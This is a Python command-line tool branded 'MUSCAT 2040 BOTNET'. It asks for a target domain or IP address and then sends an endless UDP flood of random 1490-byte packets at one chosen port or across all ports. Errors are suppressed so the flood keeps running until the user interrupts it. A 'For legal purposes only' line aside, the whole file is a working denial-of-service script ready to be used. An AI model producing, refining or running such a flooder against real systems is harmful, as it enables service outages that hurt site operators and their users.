# Import.
from platform import system
import os
import time
import random
import socket
import pyfiglet

# Version and Author Info 
version = "1.2"
author = "M.ALFAHDI"

# Platform info
uname = system()
cmd_clear = 'cls' if uname == "Windows" else 'clear'
os.system(cmd_clear)

# Socket initialization
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
bytes = random._urandom(1490)

# MUSCAT 2040 BOTNET Main Menu
while True:
    os.system(cmd_clear)
    print("\033[91m" + pyfiglet.figlet_format("MUSCAT 2040", font="small") + "\033[0m")
    print("\033[95m" + pyfiglet.figlet_format("BOTNET", font="small") + "\033[0m")
    print(f"                        Version: {version}")
    print(f"                        Author: {author}")
    print('                   For legal purposes only')
    print("\033[92;1m\n1. Website Domain\n2. IP Address\n3. About\n4. Exit\033[0m")

    opt = str(input("\n> "))

    if opt == '1':
        domain = str(input("Domain:"))
        ip = socket.gethostbyname(domain)
        break
    elif opt == '2':
        ip = str(input("IP Address: "))
        break
    elif opt == '3':
        print("\n\033[101mEasy.  Secure.  Open.\033[0m")
        print("Author: Mohammed Alfahdi.")
        input("\nPress Enter to continue.")
    elif opt == '4':
        exit()

# Port selection
port_mode = False 
port = 2
while True:
    choice = str(input("Certain port? [y/n]: ")).lower()
    if choice == "y":
        port_mode = True
        port = int(input("Port: "))
        break
    elif choice == "n":
        break

os.system(cmd_clear)
print('\033[36;2mSTARTING INFINITE FLOOD...')
time.sleep(2)

sent = 0

# --- THE FIX: Try/Except is now INSIDE the loops ---
if not port_mode:  # All ports mode
    while True:
        try:
            if port >= 65534: port = 1
            if port == 1900: port = 1901
            
            sock.sendto(bytes, (ip, port))
            sent += 1
            port += 1
            print(f"\033[32;1mSent {sent} packets to {ip} through port:{port}")
        except KeyboardInterrupt:
            print('\n\033[31;1mStopped by User\033[0m')
            break
        except:
            continue # This ignores errors and keeps the loop running

else: # Certain port mode
    while True:
        try:
            sock.sendto(bytes, (ip, port))
            sent += 1
            print(f"\033[32;1mSent {sent} packets to {ip} through port:{port}")      
        except KeyboardInterrupt:
            print('\n\033[31;1mStopped by User\033[0m')
            break
        except:
            continue # This ensures it never stops until you hit Ctrl+C